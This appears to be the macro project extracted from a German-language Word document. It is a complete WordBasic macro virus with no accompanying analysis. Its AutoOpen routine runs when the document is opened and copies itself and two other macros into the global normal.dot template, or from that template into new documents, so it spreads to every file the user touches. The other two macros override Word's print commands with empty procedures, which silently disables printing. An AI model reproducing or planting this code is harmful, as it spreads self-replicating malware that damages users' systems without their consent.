   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "DateiDruckenStandard"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Druckt das aktive Dokument mit den aktuellen Standardeinstellungen."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DateiDruckenStandard.MAIN"
   End Sub

   Attribute VB_Name = "DateiDrucken"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Druckt das aktive Dokument."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DateiDrucken.MAIN"
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim Z$
   Dim Q$
   WordBasic.FileSaveAs Format:=1
    If WordBasic.CountMacros(1) <> 0 Then
    Z$ = WordBasic.[DefaultDir$](2) + "\normal.dot":
    Q$ = WordBasic.[FileName$]():
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
    Name:="AutoOpen", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
    Name:="DateiDrucken", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
    Name:="DateiDruckenStandard", Tab:=3
    Else
    Q$ = WordBasic.[DefaultDir$](2) + "\normal.dot":
    Z$ = WordBasic.[FileName$]():
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
    Name:="AutoOpen", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
    Name:="DateiDrucken", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
    Name:="DateiDruckenStandard", Tab:=3
   End If
   WordBasic.FileSaveAll
   End Sub
